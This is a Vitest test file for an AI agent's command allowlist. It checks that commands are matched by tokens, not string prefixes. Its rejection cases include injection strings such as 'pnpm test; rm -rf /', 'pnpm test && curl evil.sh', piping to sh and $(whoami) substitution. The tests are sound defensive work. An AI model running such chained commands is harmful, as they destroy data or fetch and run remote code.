import { describe, expect, it } from 'vitest';
import { CommandAllowlist } from '#modules/agent/command.allowlist.js';

/**
 * The allowlist matches argv, not strings. Every case below is one where a prefix check on the raw
 * command would have said yes.
 */
describe('CommandAllowlist', () => {
    const list = new CommandAllowlist(['pnpm build', 'pnpm test', 'git status']);

    it('allows an exact allowlisted command', () => {
        expect(list.check('pnpm build')).toMatchObject({ allowed: true, argv: ['pnpm', 'build'] });
    });

    it('allows extra arguments after an allowlisted prefix', () => {
        expect(list.check('pnpm test --run')).toMatchObject({ allowed: true, argv: ['pnpm', 'test', '--run'] });
    });

    it('normalises repeated whitespace', () => {
        expect(list.check('  pnpm   build  ')).toMatchObject({ allowed: true, argv: ['pnpm', 'build'] });
    });

    it('refuses a command that is not on the list', () => {
        expect(list.check('curl https://example.com')).toMatchObject({ allowed: false });
    });

    it('refuses a command whose first token merely starts with an allowed one', () => {
        // `pnpmx` is not `pnpm`; token equality, not string prefix.
        expect(list.check('pnpmx build')).toMatchObject({ allowed: false });
    });

    it.each([
        ['pnpm test; rm -rf /', 'chaining with ;'],
        ['pnpm test && curl evil.sh', 'chaining with &&'],
        ['pnpm test | sh', 'piping'],
        ['pnpm test > /etc/passwd', 'redirecting'],
        ['pnpm test $(whoami)', 'command substitution'],
        ['pnpm test `whoami`', 'backtick substitution'],
        ['pnpm test\nrm -rf /', 'a newline'],
        ['pnpm test &', 'backgrounding'],
    ])('refuses %s (%s), because there is no shell to interpret it', command => {
        const decision = list.check(command);
        expect(decision.allowed).toBe(false);
        expect((decision as { reason: string }).reason).toContain('shell');
    });

    it('refuses an empty command', () => {
        expect(list.check('   ')).toMatchObject({ allowed: false });
    });

    it('refuses everything when the allowlist is empty', () => {
        expect(new CommandAllowlist([]).check('pnpm build')).toMatchObject({ allowed: false });
    });
});
